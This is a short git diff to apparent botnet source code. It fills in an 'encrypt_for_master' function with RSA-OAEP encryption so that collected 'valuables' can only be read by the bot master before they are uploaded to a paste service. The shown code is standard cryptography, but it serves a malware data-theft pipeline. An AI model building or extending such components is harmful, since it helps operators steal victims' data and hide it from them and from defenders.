@@ -1,6 +1,7 @@
 import os
 
 from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 from Crypto.Signature import PKCS1_v1_5
 from Crypto.Hash import SHA256
 
@@ -18,7 +19,14 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return data
+
+    f = open("master_bot_public_key.pem", "r")
+    public_key = RSA.importKey(f.read())
+    f.close()
+
+    cipher = PKCS1_OAEP.new(public_key, hashAlgo=SHA256)
+    encrypted_data = cipher.encrypt(data)
+    return encrypted_data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
